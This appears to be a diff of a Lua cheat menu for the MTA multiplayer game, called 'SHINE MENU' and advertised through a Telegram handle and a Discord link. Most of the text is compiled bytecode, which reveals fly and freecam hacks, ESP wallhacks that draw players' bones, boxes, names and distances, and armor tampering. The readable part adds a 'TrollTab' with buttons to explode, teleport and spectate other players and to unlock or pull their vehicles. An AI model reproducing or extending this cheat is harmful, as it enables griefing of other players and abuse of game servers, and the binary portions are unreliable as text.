-   getTickCount    ipairs 	   onChange    interpolateBetween    from            to    start 	   duration    easing    type    onEnd 	   function    table    remove     )   x  x  y  y  y  y  z  z  z  z  z  z  z  z  z  z  z  z  z  z  z  {  {  {  {  {  |  |  |  |  |  }  }            y  €  ‚              „      
-(   Å      Ü€ @ÀÀ€Å€   € Ü€ Ú   €€Å     Ü€ ÀÀ@€Å     @€ Ü€€  @€ @A €€ ƒ@€Á @€À €€ @ €B€ ^ !  @þÂ   Þ   €       type    string 
-   isElement 	   function    getEventHandlers    table            ipairs     (   …  …  …  …  …  …  …  …  …  …  …  …  …  …  …  †  †  †  †  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ‡  ˆ  ˆ  ˆ  ˆ  ‰  ‰  Š  Š  ˆ  ‹                    ’  š           E@  …€  Å@  œ€ “  @€À  E€  …@  \  @  €  E@  €    €€  A@ € ÁÀ  d  @  € 	      guiSetVisible    ShineBG    guiGetVisible    showCursor    animate         š™™™™™é?      ð?      ‰@       –  ˜       E   …@  À   \@€ €       guiSetAlpha    ShineBG        —  —  —  —  ˜             “  “  “  “  “  “  “  ”  ”  ”  ”  ”  •  •  •  •  •  –  –  –  –  –  ˜  –  š                            E@  €  ÁÀ  @    E@    ÁÀ  @  €       setPedAnimationSpeed    localPlayer    run_player       @   SPRINT_civi        ž  ž  ž  ž  ž  Ÿ  Ÿ  Ÿ  Ÿ  Ÿ                 ¢  ²     L      E@  €  ÁÀ  @    E@    ÁÀ  @    E@  @ ÁÀ  @    E@  € ÁÀ  @    E@  À ÁÀ  @    E@    ÁÀ  @    E@  @ ÁÀ  @    E@  € ÁÀ  @    E@  À ÁÀ  @    E@    ÁÀ  @    E@  @ ÁÀ  @    E@  € ÁÀ  @    E@  À ÁÀ  @    E@    ÁÀ  @    E@  @ ÁÀ  @  €       setPedAnimationSpeed    localPlayer    buddy_crouchreload       $@
-   buddy_reload    colt45_crouchreload    colt45_reload    sawnoff_reload    python_crouchreload    python_reload    RIFLE_crouchload    RIFLE_load 
-   CrouchReload    Silence_reload    TEC_crouchreload    TEC_reload    UZI_crouchreload    UZI_reload     L   £  £  £  £  £  ¤  ¤  ¤  ¤  ¤  ¥  ¥  ¥  ¥  ¥  ¦  ¦  ¦  ¦  ¦  §  §  §  §  §  ¨  ¨  ¨  ¨  ¨  ©  ©  ©  ©  ©  ª  ª  ª  ª  ª  «  «  «  «  «  ¬  ¬  ¬  ¬  ¬  ­  ­  ­  ­  ­  ®  ®  ®  ®  ®  ¯  ¯  ¯  ¯  ¯  °  °  °  °  °  ±  ±  ±  ±  ±  ²              ¹  æ        E   \€€ Z@  À €E@  \€€ Z     € € E€  …À  \€ Z     € € E  …À  \ A Á 
-BÀ €A …Â Å ÆBÂœ@€Åƒ  €Üƒ Ú    €€ ¡‚  Àý…Â †CÎÂÌƒœ‚ ‚ Î‚‚‚À€Å‚ C Ü‚ Ú   €ÌÂ Œ @ €Å‚ Ã  @€ € À€ÜB€ÅÂ Ã  A  ÅC  Ü ÜB  Å‚ ƒ Ü‚ Ú   €ÍÂ  @ €Å‚ Ã  @€ € À€ÜB€ÅÂ Ã  A  ÅC Ä Ü ÜB  Å‚  Ü‚ Ú   €Í‚ ŒÀ@ €Å‚ Ã  @€ € À€ÜB€ÅÂ Ã  A  ÅC D Ü ÜB  Å‚ ƒ Ü‚ Ú   €Ì‚ À@ €Å‚ Ã  @€ € À€ÜB€ÅÂ Ã  A  ÅC Ä Ü ÜB  Å‚  Ü‚ Ú  €€Ì €Å‚ Ã  @€ € À€ÜB€Å‚ C Ü‚ Ú  €€Í €Å‚ Ã  @€ € À€ÜB€ €       isChatBoxInputActive    isConsoleActive    getPedOccupiedVehicle    localPlayer    getElementPosition    getCameraMatrix š™™™™™¹?   pairs    Fly    speedMultipliers    getKeyState    math    sqrt    w    setElementPosition    setElementRotation            rotationFromCamera    s      €f@   a      àp@   d      €V@   space    lctrl         º  º  º  º  º  º  º  º  º  »  »  »  »  »  »  ½  ½  ½  ¾  ¾  ¿  ¿  ¿  Á  Â  Â  Â  Â  Â  Ã  Ã  Ã  Ã  Ã  Ä  Â  Å  Ç  Ç  Ç  Ç  Ç  Ç  Ç  È  È  È  Ê  Ê  Ê  Ê  Ê  Ë  Ë  Ë  Ì  Ì  Ì  Ì  Ì  Ì  Í  Í  Í  Í  Í  Í  Í  Í  Ï  Ï  Ï  Ï  Ï  Ð  Ð  Ð  Ñ  Ñ  Ñ  Ñ  Ñ  Ñ  Ò  Ò  Ò  Ò  Ò  Ò  Ò  Ò  Ô  Ô  Ô  Ô  Ô  Õ  Õ  Õ  Ö  Ö  Ö  Ö  Ö  Ö  ×  ×  ×  ×  ×  ×  ×  ×  Ù  Ù  Ù  Ù  Ù  Ú  Ú  Ú  Û  Û  Û  Û  Û  Û  Ü  Ü  Ü  Ü  Ü  Ü  Ü  Ü  Þ  Þ  Þ  Þ  Þ  ß  à  à  à  à  à  à  â  â  â  â  â  ã  ä  ä  ä  ä  ä  ä  æ              ç  ï       E   \€ A Í€B  ‚@EB  FÂÀ‚\ ‚  À‚@ €Y AÀ € Á€ € A  €BAR L‚ÁL€^  €       getCameraMatrix    math    deg    atan              €f@     €V@       è  è  é  é  ê  ê  ê  ê  ê  ê  ê  ë  ë  ë  ë  ë  ë  ë  ë  ì  î  î  î  î  ï                      E   \€€ Z   € €B   ^  À €D   €   ]  ^    €       isMTAWindowActive                                              ƒ  	   +     D € …   †@@À € œ€ Å   Æ€À € Ü€   @@   Î   @@€  E  FAÀ€  \ AEÁ  \ A‚NÁLBŽAŒ‚‚Ä ÆBÁ€D FƒÁƒ   € € ÆÂAÀ€€D FÂƒ   @ € ÆBB ƒB   !€ ÃBD FÃ‚  Ä€ DCÜƒ Ú  À €Ä ÌƒÈ ‚€ Ä€ „CÜƒ Ú  À €Ä ÍƒÈ ‚€ Â  €D FÄÃ„   @€€ ˆ@ € €€ODD
-D€Â€ €D F„Ä„   @€€ D@ € €€ODDD€Â€ WÀD €  ˆÀ € 
-D @€  D€ € D WÀÄ €€ ˆÀ €€
-D€@€€ D€ €€D€ R€ „@€ @€ €  €€  „@ €È @€ R€@@ €€ €ODDR€ „€€€ODD@€ € €@€€ „@ €È€ 
-€€R€@ 	€€€@€   €€D FCÃƒ     €È €D FƒÃƒ   @ €€ €D FƒÄƒ     €È€€D FÃÃƒ   @ €€€
-‚MC Å  ÆÅNDƒDN„DÜƒ ÄOÄƒ Á  AE ŽE…Î	ÅÎÅ	FÍ†NÆ„
-FD NFLA†D NF†ŒAD NFÌA†D€NFLA†D€NF†ŒAD€NFÌA†D NF„€Ž†L††H D NF†„€Ž††L††H€D NF„€Ž†L††H NAB†NÁLBNAŒB†E† €€À  €@ €€À \F€ €       math    sin    cos    getCameraMatrix       Y@   normalMaxSpeed 
-   key_fastMove 
-   fastMaxSpeed 
-   key_slowMove 
-   slowMaxSpeed    smoothMovement 
-   acceleration    decceleration    key_forward 
-   key_backward 
-   key_right                @	   key_left    sqrt       ð?   setCameraMatrix     +                                                            !  !  "  "  #  #  $  $  $  $  $  $  %  %  %  &  &  &  &  &  &  '  '  *  *  *  *  +  +  ,  ,  -  .  .  .  .  .  .  /  /  /  0  2  2  2  2  2  2  3  3  3  4  6  7  7  7  7  7  7  8  8  8  9  9  ;  ;  ;  ;  <  >  >  >  >  >  >  ?  ?  ?  @  @  B  B  B  B  C  E  E  F  F  F  G  G  G  G  H  H  H  I  I  I  L  L  M  M  M  N  N  N  N  O  O  O  P  P  P  S  S  S  S  S  S  S  T  T  T  U  U  U  V  V  W  W  W  W  X  X  Z  Z  Z  Z  Z  Z  Z  Z  Z  [  [  [  \  \  \  ]  ]  ^  ^  ^  ^  _  _  `  b  b  c  c  d  d  d  d  d  d  d  e  e  e  e  e  e  e  e  f  f  f  f  f  f  f  g  g  g  g  g  g  g  g  i  j  k  l  l  l  l  l  l  l  l  m  n  o  p  q  r  s  s  s  t  t  t  u  u  u  v  v  v  w  w  w  x  x  x  y  y  y  z  z  z  {  {  {  |  |  |  |  |  |  }  }  }  }  }  }  ~  ~  ~  ~  ~  ~      €  €      ‚  ‚  ‚  ‚  ‚  ‚  ‚  ‚  ƒ              …  §   	^     € A  À €A  €   À €     € €€   À €  
-A   € A Á€ A€ÁÍ€„€ †ÁAš    €Ò €„ Ä€ ÆÂÎÁÎAÂŒÁˆ „€Ä€ ÆÂÎÁÎAÂÁˆ€… †ÁBÄ À €Ä ‚ƒÍ‚È À€Ä   ‚À €Ä ‚ƒÌ‚È Ä€À €Ä€‚ƒÍ‚È€À€Ä€  ‚À €Ä€‚ƒÌ‚È€Ä€ C ‚À €Ò ÏÃÈ€@€Ä€CÀ@ €ÏCÈ€ € 
-      isCursorShowing    isMTAWindowActive       @              ð?   guiGetScreenSize        @   invertMouseLook    mouseSensitivity ÊÃB­iÞ‘?   math    pi ffffff @    ^   †  †  †  †  †  †  †  †  ‡  ‡  ˆ  ˆ  ‰  ‰  ‰  Š  Š  Š  ‹      Ž  Ž              ‘  “  “  “  “  “  “  “  ”  ”  ”  ”  ”  ”  ”  –  –  —  —  —  ˜  ˜  ˜  ˜  ˜  ™  ™  ™  ™  š  š  š  š        ž  ž  ž  ž  ž  Ÿ  Ÿ  Ÿ  Ÿ              ¢  ¢  ¢  ¢  ¢  £  £  £  £  ¤  ¤  ¤  ¤  ¥  ¥  §              ©  ²          €Z   €€š    €Å   A  E  …Á  Ü@ Å    Ü@ Å@  D  „€ Ü@ Å@ Á D  „ Ü@ Â € Þ   €       setCameraMatrix    camPosX    camPosY    camPosZ    toggleAllControls    addEventHandler    onClientRender    onClientCursorMove        ª  ª  ª  ª  ª  ª  «  «  «  «  «  ­  ­  ­  ®  ®  ®  ®  ®  ¯  ¯  ¯  ¯  ¯  ±  ±  ²              ´  È  	 <   E   @  Ä   € \€ Z   @€A€  €  Á€  È  ˆ €H  A€  H €A€  H  E€ \  Ç@ ‡  GÀ  EÀ „ €\€ Z    €E  …@ Ä €œ€ ÅÀ   EA \@€@€E  „ €ÅÀ   EA \@€E   € Ä    \@ EÀ ‚ € \@ @  € €E  „ €\@ B € ^  B   ^   € 
-      removeEventHandler    onClientRender            SetX    SetY    SetZ    getCameraMatrix    isPedInVehicle    setElementPosition    getPedOccupiedVehicle    onClientCursorMove    toggleAllControls    setCameraTarget     <   µ  µ  µ  µ  µ  µ  µ  ¶  ¶  ¶  ¶  ¶  ¶  ·  ·  ¸  ¸  ¹  ¹  ¹  ¹  ¹  º  º  º  º  º  »  »  »  »  »  »  »  »  »  ½  ½  ½  ½  ½  ½  ¿  ¿  ¿  ¿  ¿  À  À  À  Á  Á  Â  Â  Â  Å  Å  Ç  Ç  È              Ê  Ñ              € €@  @€ @ €€  @€           €       isFreecamEnabled    setFreecamDisabled    setFreecamEnabled        Ë  Ë  Ë  Ì  Ì  Ì  Î  Î  Ð  Ð  Ð  Ñ              Ó  Ö          @€ @  D   €  @€ €       cancelEvent    setPedArmor       ð?       Ô  Ô  Õ  Õ  Õ  Õ  Ö              Ø  Ú    	      E@  €  ÅÀ   Ü€ Ô €A E „  \ Á Å   Ü •À@€ € 	      guiSetText 
-   ShineInfo i   SHINE MENU - Version 1.3 | Telegram: @ABUSERMTA - Discord: https://discord.gg/DfnHaDSX
+PlayersGrid = guiCreateGridList(0.02, 0.04, 0.23, 0.94, true, TrollTab)
+guiGridListAddColumn(PlayersGrid, "Select Player",0.85)
+ShineMenu.button[14] = guiCreateButton(0.26, 0.42, 0.24, 0.16, "Spectate Player", true, TrollTab)
+guiSetFont(ShineMenu.button[14], "default-bold-small")
+guiSetProperty(ShineMenu.button[14], "NormalTextColour", "FFFF0000")
+ShineMenu.button[15] = guiCreateButton(0.26, 0.62, 0.24, 0.16, "Explode Player", true, TrollTab)
+guiSetFont(ShineMenu.button[15], "default-bold-small")
+guiSetProperty(ShineMenu.button[15], "NormalTextColour", "FFFF0000")
+ShineMenu.button[16] = guiCreateButton(0.26, 0.23, 0.24, 0.16, "Teleport Player", true, TrollTab)
+guiSetFont(ShineMenu.button[16], "default-bold-small")
+guiSetProperty(ShineMenu.button[16], "NormalTextColour", "FFFF0000")
+Line = guiCreateLabel(0.52, 0.04, 0.03, 0.92, "|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n|\n", true, TrollTab)
+guiSetFont(Line, "default-bold-small")
+guiLabelSetColor(Line, 255, 0, 0)
+ShineMenu.button[17] = guiCreateButton(0.56, 0.04, 0.19, 0.16, "Explode Near Players", true, TrollTab)
+guiSetFont(ShineMenu.button[17], "default-bold-small")
+guiSetProperty(ShineMenu.button[17], "NormalTextColour", "FFFF0000")
+ShineMenu.button[18] = guiCreateButton(0.77, 0.04, 0.19, 0.16, "Pull Vehicles", true, TrollTab)
+guiSetFont(ShineMenu.button[18], "default-bold-small")
+guiSetProperty(ShineMenu.button[18], "NormalTextColour", "FFFF0000")
+ShineMenu.button[19] = guiCreateButton(0.56, 0.24, 0.19, 0.16, "Bomb Click", true, TrollTab)
+guiSetFont(ShineMenu.button[19], "default-bold-small")
+guiSetProperty(ShineMenu.button[19], "NormalTextColour", "FFFF0000")
+ShineMenu.button[20] = guiCreateButton(0.77, 0.24, 0.19, 0.16, "Explode Near Empty Vehicles", true, TrollTab)
+guiSetFont(ShineMenu.button[20], "default-bold-small")
+guiSetProperty(ShineMenu.button[20], "NormalTextColour", "FFFF0000")
+ShineMenu.button[21] = guiCreateButton(0.56, 0.42, 0.19, 0.16, "Teleport Click", true, TrollTab)
+guiSetFont(ShineMenu.button[21], "default-bold-small")
+guiSetProperty(ShineMenu.button[21], "NormalTextColour", "FFFF0000")
+ShineMenu.button[22] = guiCreateButton(0.77, 0.42, 0.19, 0.16, "Fire Yourself", true, TrollTab)
+guiSetFont(ShineMenu.button[22], "default-bold-small")
+guiSetProperty(ShineMenu.button[22], "NormalTextColour", "FFFF0000")
+ShineMenu.button[23] = guiCreateButton(0.56, 0.62, 0.19, 0.16, "Position Troll", true, TrollTab)
+guiSetFont(ShineMenu.button[23], "default-bold-small")
+guiSetProperty(ShineMenu.button[23], "NormalTextColour", "FFFF0000")
+ShineMenu.button[24] = guiCreateButton(0.77, 0.62, 0.19, 0.16, "Unlock Vehicles", true, TrollTab)
+guiSetFont(ShineMenu.button[24], "default-bold-small")
+guiSetProperty(ShineMenu.button[24], "NormalTextColour", "FFFF0000")
+ShineMenu.button[25] = guiCreateButton(0.56, 0.82, 0.19, 0.16, "Engine Fire", true, TrollTab)
+guiSetFont(ShineMenu.button[25], "default-bold-small")
+guiSetProperty(ShineMenu.button[25], "NormalTextColour", "FFFF0000")
+ShineMenu.button[26] = guiCreateButton(0.77, 0.82, 0.19, 0.16, "Add Nitro", true, TrollTab)
+guiSetFont(ShineMenu.button[26], "default-bold-small")
+guiSetProperty(ShineMenu.button[26], "NormalTextColour", "FFFF0000")
 
-Online Players:     getElementsByType    player     | Interior:     getElementInterior     | Dimension:     getElementDimension        Ù  Ù  Ù  Ù  Ù  Ù  Ù  Ù  Ù  Ù  Ù  Ù  Ù  Ù  Ù  Ù  Ù  Ú              Ý  å     $      E@  @ €  EÀ    \    À€EA …A  \ … À œEÂ …B  À€ EC € \ƒ ‚  Â  \B€E‚ …B  À€ @ €€À \B€!€  @ù €       guiGridListClear    PlayersGrid    pairs    getElementsByType    player    guiGridListAddRow    getPlayerNametagColor    guiGridListSetItemText       ð?   getPlayerName    guiGridListSetItemColor     $   Þ  Þ  Þ  ß  ß  ß  ß  ß  ß  à  à  à  á  á  á  â  â  â  â  â  â  â  â  â  â  ã  ã  ã  ã  ã  ã  ã  ã  ß  ã  å              è  ë           @€ @  @€  €       refreshPlayersList    refreshInformation        é  é  ê  ê  ë              í  ð           @€ @  @€  €       refreshPlayersList    refreshInformation        î  î  ï  ï  ð              ò  ô           @€  €       refreshInformation        ó  ó  ô              ö  ø           @€  €       refreshInformation        ÷  ÷  ø              ú          …   À   œ€ š   À€Å@     @ ›A€   €  Ý  Þ   Â   Þ   €       guiGridListGetSelectedItem    guiGridListGetItemText       ð?       û  û  û  ü  ü  ý  ý  ý  ý  ý  ý  ý  ý  ÿ  ÿ                          E   €   \€ Z    €E@  €   \€ W€À @ €B € ^  EÀ  …  À   œ  \€  Z   € €B € Z@  @ €B € @ €B@  B € ^   €    
-   isElement    getElementType    vehicle    next    getVehicleOccupants                                                                            	     
-   Å  B  Ü ÚA  €€€@  €ÀÀ €€Å   AB € À€ƒAÜA  €       guiGetVisible    ShineBG    left    down    createProjectile       5@š™™™™™¹?       
-  
-  
-  
-  
-                                              Å  B  Ü ÚA  @€€@ À€ÀÀ @€Å   @ €€ÌBAÜA€ €       guiGetVisible    ShineBG    left    down    setElementPosition       ð?                                                           …  š  À€Š  å  ¢A  Û  € €ÅA     Ü ‚  AÂ  €€Á  € A …C À œƒ Áƒ UÂƒÂ ÁÂ Ã B€ B  €       isTriggerLoggerEnabled    getResourceName    outputChatBox    #FF0000[SHINE-DEBUG]:#FFFFFF      |     inspect          ào@                                                                           $  '        @  E€  € À@  A    @ E€ À Å  Æ@Â  Ü€  • @€ €       EspDistance    guiScrollBarGetScrollPosition    EspDistanceScroll       Y@     ˆ³@   guiSetText    EspDistanceLabel    Current Esp Distance Limit:     math    floor     M        %  %  %  %  %  %  &  &  &  &  &  &  &  &  &  &  '              N  X    0      E@  …€  ÅÀ  Ü € œ€  Å  A \    @€E …Á †B†AB\ ZA  À €D  @  € €E …  ÅÁ   Ü œ  Á \Á€Z   €š  €€Å  B Ü €ƒ @ € À€C á   þ!€  Àö €       pairs    getElementsWithinRange    Vector3    getCameraMatrix    EspDistance    player    guiCheckBoxGetSelected    Esp    Tik       ð?   getScreenFromWorldPosition    getElementPosition {®Gáz”?   boneRelations 
-   drawBones     0   O  O  O  O  O  O  O  O  O  O  O  P  P  P  P  P  P  P  P  P  P  P  Q  Q  Q  Q  Q  Q  Q  Q  R  R  R  R  S  S  S  S  T  T  T  T  T  S  T  O  V  X              Z  h    8      À €Z   @ €š@    € € Å      @€ Ü …A  À œ@	€Å     @€Ü…ƒ  À€  @€€€À  €EÅ   ÁE F \… …… ÅÅ  € Ü…  Æ EF €  \   œ…  …BŽÅBÂ€ œC š   €… À   €@ œC ¡  Àõ € 
-      getPedBonePosition    pairs 
-   dxDrawLine3D    tocolor      ào@           getDistanceBetweenPoints3D    Vector3    getCameraMatrix    getElementPosition      Àb@      >@
-   drawBones     8   [  [  [  [  [  [  \  _  _  _  _  a  a  a  a  b  b  b  b  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  c  d  d  e  e  e  e  e  a  f  h              j      {     E@  …€  ÅÀ  Ü € œ€  Å  A \     [€E …Á †B†AB\ ZA  À €D  @  €ÀX€E …  ÅÁ   Ü œ  Á \Á€Z  ÀU€š  @U€ÅA   ÜÁEÃ € \„ LDƒŒ„ÌÄEƒL…ƒŒÅÅÅ  AF F Ü… † E†  …Æ  œ€ \†  …†  ÅÆ   Ü œ  †  ÆDEB€ D „ LDƒŒ„ÌÄEL…ŒÅÅÅ  AF F Ü… † E†  …Æ  œ€ \†  …†  ÅÆ   Ü œ  †  ÆDEB€ D „ LDŒ„ƒÌÄEƒL…ƒŒÅÅÅ  AF F Ü… † E†  …Æ  œ€ \†  …†  ÅÆ   Ü œ  †  ÆDEB€ D „ LDŒ„ÌÄEL…ƒŒÅÅÅ  AF F Ü… † E†  …Æ  œ€ \†  …†  ÅÆ   Ü œ  †  ÆDEB€ D „ LDƒŒ„ÌÄÍDÅ	EƒL…ƒŒÅEEÅÅ  AF F Ü… † E†  …Æ  œ€ \†  …†  ÅÆ   Ü œ  †  ÆDEB€ D „ LDƒŒ„ÌÄÍDÅ	EL…ŒÅEEÅÅ  AF F Ü… † E†  …Æ  œ€ \†  …†  ÅÆ   Ü œ  †  ÆDEB€ D „ LDŒ„ƒÌÄÍDÅ	EƒL…ƒŒÅEEÅÅ  AF F Ü… † E†  …Æ  œ€ \†  …†  ÅÆ   Ü œ  †  ÆDEB€ D „ LDŒ„ÌÄÍDÅ	EL…ƒŒÅEEÅÅ  AF F Ü… † E†  …Æ  œ€ \†  …†  ÅÆ   Ü œ  †  ÆDEB€ D „ LDƒŒ„ÌÄEƒL…ŒÅEEÅÅ  AF F Ü… † E†  …Æ  œ€ \†  …†  ÅÆ   Ü œ  †  ÆDEB€ D „ LDŒ„ƒÌÄEL…ƒŒÅEEÅÅ  AF F Ü… † E†  …Æ  œ€ \†  …†  ÅÆ   Ü œ  †  ÆDEB€ D „ LDƒŒ„ƒÌÄEƒL…ƒŒÅEEÅÅ  AF F Ü… † E†  …Æ  œ€ \†  …†  ÅÆ   Ü œ  †  ÆDEB€ D „ LDŒ„ÌÄEL…ŒÅEEÅÅ  AF F Ü… † E†  …Æ  œ€ \†  …†  ÅÆ   Ü œ  †  ÆDEB€ D !€   ¤ €       pairs    getElementsWithinRange    Vector3    getCameraMatrix    EspDistance    player    guiCheckBoxGetSelected    Esp    Tik       ð?   getScreenFromWorldPosition    getElementPosition {®Gáz”?   getElementBoundingBox 
-   dxDrawLine3D    tocolor      ào@           getDistanceBetweenPoints3D      Àb@      >@ffffffþ?    {  k  k  k  k  k  k  k  k  k  k  k  l  l  l  l  l  l  l  l  l  l  l  m  m  m  m  m  m  m  m  n  n  n  n  o  o  o  p  p  p  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  q  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  r  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  s  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  t  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  v  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  w  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  x  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  y  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  {  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  |  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  }  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  ~  k                  ƒ  ‹    8      E@  …€  ÅÀ  Ü € œ€  Å  A \    @
-€E …Á †B†AB\ ZA  À €D  @  € €E …  ÅÁ   Ü œ  Á \Á€Z   €š  €€ÅA ‚  EÂ „  \ ‚  E‚  …Â À œ \‚  …‚ ÁÂ  A œ‚ ÁB € ÜA !€  Àô €       pairs    getElementsWithinRange    Vector3    getCameraMatrix    EspDistance    player    guiCheckBoxGetSelected    Esp    Tik       ð?   getScreenFromWorldPosition    getElementPosition {®Gáz”?
-   dxDrawLine3D    tocolor      ào@            8   „  „  „  „  „  „  „  „  „  „  „  …  …  …  …  …  …  …  …  …  …  …  †  †  †  †  †  †  †  †  ‡  ‡  ‡  ‡  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  ˆ  „  ‰  ‹                •  	&G   …  À  œEC  \ D   €„  EÄ  € À€\Ä Z  €
-€š   
-€Å  € LEÁ	À€  	E† ›F€  €Æ ÛF   €ÁÆ G€  €Ç [G   €AÇ \†€… ÁF ‡ A‡ Ç Á‡ ˆ E …H Å  	  Ü œˆ  ÅH 	  @	  	 Ü  \ˆ  OˆÃÈ œ†€ÛF€  €Á G AG ‚  Â  € B€ ‚  ÜD  €       getElementPosition    getCameraMatrix       ð?   getScreenFromWorldPosition    dxDrawText        @   tocolor      ào@   interpolateBetween ÍÌÌÌÌÌô?        š™™™™™¹?   getDistanceBetweenPoints3D    Vector3      Àb@   Linear    arial    center     G   Ž  Ž  Ž            ‘  ‘  ‘  ‘  ‘  ’  ’  ’  ’  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  “  •              —  Ÿ    2      E@  …€  ÅÀ  Ü € œ€  Å  A \    À€E …Á †B†AB\ ZA  À €D  @  €€€E …  ÅÁ   Ü œ  Á \Á€Z  €€š   €ÅA   E‚ € \‚ B ÁÂ  A Ã ÁC „ ÜA !€  @ö €       pairs    getElementsWithinRange    Vector3    getCameraMatrix    EspDistance    player    guiCheckBoxGetSelected    Esp    Tik       ð?   getScreenFromWorldPosition    getElementPosition {®Gáz”?   dxDrawTextOnElement    getPlayerName      ào@        
-   default-bold       Y@    2   ˜  ˜  ˜  ˜  ˜  ˜  ˜  ˜  ˜  ˜  ˜  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  ™  š  š  š  š  š  š  š  š  ›  ›  ›  ›  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ  œ  ˜    Ÿ              ¡  ©    @      E@  …€  ÅÀ  Ü € œ€  Å  A \    @€E …Á †B†AB\ ZA  À €D  @  € 
-€E …  ÅÁ   Ü œ  Á \Á€Z   €š  €€ÅA   E‚ FÂÃ… Å‚  Ã D   Ü‚  ƒ  EÃ € \   œ  \‚  B U‚‚B Á‚ Ã AÃ ƒ Á D ÜA !€  Àò €       pairs    getElementsWithinRange    Vector3    getCameraMatrix    EspDistance    player    guiCheckBoxGetSelected    Esp    Tik       ð?   getScreenFromWorldPosition    getElementPosition {®Gáz”?   dxDrawTextOnElement    math    floor    getDistanceBetweenPoints3D     M      ào@        
-   default-bold       I@    @   ¢  ¢  ¢  ¢  ¢  ¢  ¢  ¢  ¢  ¢  ¢  £  £  £  £  £  £  £  £  £  £  £  ¤  ¤  ¤  ¤  ¤  ¤  ¤  ¤  ¥  ¥  ¥  ¥  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¦  ¢  §  ©              «  ²    -      E@  …€  ÅÀ  Ü € œ€  Å  A \    €€E …  ÅÁ   Ü œ  Á \Á€Z   €š  €€ÅA ‚  EÂ „  \ ‚  E‚  …Â À œ \‚  …‚ ÁÂ  A œ‚ ÁB € ÜA !€  €÷ €       pairs    getElementsWithinRange    Vector3    getCameraMatrix    EspDistance    vehicle    getScreenFromWorldPosition    getElementPosition {®Gáz”?
-   dxDrawLine3D    tocolor      ào@              ð?    -   ¬  ¬  ¬  ¬  ¬  ¬  ¬  ¬  ¬  ¬  ¬  ­  ­  ­  ­  ­  ­  ­  ­  ®  ®  ®  ®  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¯  ¬  °  ²              ´  »     )      E@  …€  ÅÀ  Ü € œ€  Å  A \    €€E …  ÅÁ   Ü œ  Á \Á€Z   €š  €€ÅA   E‚ …Â À œ \‚   ÁB ƒ Aƒ C ÁÃ „ ÜA !€  €ø €       pairs    getElementsWithinRange    Vector3    getCameraMatrix    EspDistance    vehicle    getScreenFromWorldPosition    getElementPosition {®Gáz”?   dxDrawTextOnElement    getVehicleNameFromModel    getElementModel       ð?     ào@        
-   default-bold     )   µ  µ  µ  µ  µ  µ  µ  µ  µ  µ  µ  ¶  ¶  ¶  ¶  ¶  ¶  ¶  ¶  ·  ·  ·  ·  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  ¸  µ  ¹  »              ½  Ä    5      E@  …€  ÅÀ  Ü € œ€  Å  A \    €	€E …  ÅÁ   Ü œ  Á \Á€Z   €š  €€ÅA   E‚ FÂÂ… Å‚  Ã D   Ü‚  ƒ  EÃ € \   œ  \‚  B U‚‚‚ ÁÂ  A Ã ÁC „ ÜA !€  €õ €       pairs    getElementsWithinRange    Vector3    getCameraMatrix    EspDistance    vehicle    getScreenFromWorldPosition    getElementPosition {®Gáz”?   dxDrawTextOnElement    math    floor    getDistanceBetweenPoints3D     M       ð?     ào@        
-   default-bold       IÀ    5   ¾  ¾  ¾  ¾  ¾  ¾  ¾  ¾  ¾  ¾  ¾  ¿  ¿  ¿  ¿  ¿  ¿  ¿  ¿  À  À  À  À  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  Á  ¾  Â  Ä              Æ  Ï        E   €   \€ Z   À€E@  €   \€ W€À  €E@  €   \€ ÀÀ @€E  €   Á@  \€ WÀÁ  €E  €   \€ Z   @ €B € ^  B   ^   € 	   
-   isElement    getElementType    player    ped    getPedTask 
